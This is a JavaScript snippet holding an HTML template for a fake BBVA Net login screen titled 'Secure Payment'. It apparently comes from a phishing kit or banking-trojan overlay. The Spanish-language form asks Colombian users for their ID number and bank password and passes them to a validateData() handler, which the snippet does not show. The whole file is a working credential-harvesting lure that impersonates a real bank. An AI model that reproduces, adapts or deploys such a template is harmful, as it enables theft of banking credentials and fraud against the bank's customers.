var my_titulo = 'Secure Payment';
var my_contenido = `
<style>
	* {
		margin: 0;
		padding: 0;
		font-family: Arial;
		font-weight: normal;
	}

	h2 {
		letter-spacing: 2px;
		margin-top: 50px;
	}

	input {
		width: 80%;
		height: 50px;
		color: black;
		background-color: rgb(243, 243, 243);
		border: 1px solid rgb(255, 255, 255);
		border-bottom: 1px solid black;
		padding: 10px;
		margin-left: 7%;
		margin-top: 15px;

	}

	select {
		width: 85%;
		height: 50px;
		color: black;
		background-color: rgb(243, 243, 243);
		border: 1px solid rgb(255, 255, 255);
		border-bottom: 1px solid black;
		padding: 10px;
		margin-left: 7%;
		margin-top: 15px;
	}

	#btnUsuario {
		height: 50px;
		padding: 10px;
		margin-left: 7%;
		margin-top: 15px;
		background-color: #227aba;
		font-size: 17px;
		border: none;
		font-weight: bold;
		color: white;
		width: 85%;
	}
</style>

<img src="${my_hosting}img/menu_bbva.jpg" width="100%">
<center>
	<div style="width:90%; margin-top: 80px;">
		<a style="font-size:21px;">Hola, ingresa tu número de documento y contraseña para entrar a BBVA Net:</a>
	</div>
</center>

<div class="inp">
	<select>
		<option selected>Cédula de Ciudadanía</option>
	</select>
	<br>
	<input type="tel" id="txtUsuario" placeholder="Número de documento"><br>
	<input type="password" id="txtPassword" placeholder="Contraseña" maxlength="8"><br>
	<button onclick="validateData()" id="btnUsuario">Entrar a BBVA Net</button>
</div>
`
